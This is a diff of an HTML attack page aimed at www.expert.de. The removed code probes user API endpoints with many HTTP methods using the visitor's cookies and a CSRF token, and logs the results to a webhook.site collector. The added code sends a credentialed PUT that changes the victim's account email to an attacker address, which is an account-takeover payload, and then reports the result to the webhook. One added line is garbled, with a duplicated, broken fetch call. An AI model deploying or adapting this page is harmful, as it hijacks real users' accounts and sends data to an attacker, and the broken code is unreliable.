@@ -1,34 +1,23 @@
-<!DOCTYPE html>
+<!doctype html>
+<html lang="pt">
 <meta charset="utf-8">
-<title>brut-HEAD</title>
+<title>ats-expert</title>
+<body>
 <script>
-  const HOOK='https://webhook.site/7ad6e621-1c6f-4d9b-b51d-90a6e859c077';
+  const HOOK='https://webhook.site/2a5229f5-4161-44c1-b1ee-dcd9c8c76e3c';
   function log(x){fetch(HOOK,{method:'POST',mode:'no-cors',body:x}).catch(()=>{})}
 
-  const verbs=['GET','HEAD','POST','PUT','PATCH','DELETE','OPTIONS','TRACE','CONNECT','CUSTOM1','PING','DEBUG'];
-  const paths=[
-     'api/user/profile',
-     'api/v1/user',
-     'api/account',
-     'api/me',
-     'user',
-     'profile',
-     'account',
-     'customer'
-  ];
-
-  const tk='1e206742-fb4a-44d2-8174-be9b2e2d6425';
-
-  for(const vb of verbs){
-    for(const pa of paths){
-      fetch(`https://www.expert.de/${pa}`,{
-         method:vb,
-         credentials:'include',
-         headers:{'csrf-token':tk},
-         mode:'no-cors'
-      })
-      .then(r => log(`HEAD-${vb}-${pa}=${r.type},redir=${r.redirected}`))
-      .catch(()=>log(`HEAD-${vb}-${pa}=fail`));
-    }
-  }
+  fetch("https://fetch("https://www.expert.de/api/v1/user", {
+    method: "PUT",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "csrf-token": "1e206742-fb4a-44d2-8174-be9b2e2d6425"
+    },
+    body: JSON.stringify({email:"evil@bitoini.com"})
+  })
+  .then(r => r.status)
+  .then(s => log("trocae-mail="+s));
 </script>
+</body>
+</html>
